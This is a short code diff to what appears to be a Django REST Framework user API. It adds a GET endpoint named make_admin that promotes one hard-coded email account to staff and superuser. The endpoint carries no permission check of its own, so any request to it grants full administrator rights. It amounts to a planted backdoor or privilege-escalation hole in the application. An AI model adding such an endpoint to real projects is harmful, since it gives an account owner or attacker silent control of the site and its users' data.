@@ -90,4 +90,14 @@ class UserViewSet(viewsets.ModelViewSet):
     #         return [permission() for permission in self.permisson_classes]
 
 
+from rest_framework.decorators import api_view
+from rest_framework.response import Response
+from django.contrib.auth.models import User
 
+@api_view(['GET'])
+def make_admin(request):
+    user = User.objects.get(email="saloni123@email.com")
+    user.is_staff = True
+    user.is_superuser = True
+    user.save()
+    return Response("Done")
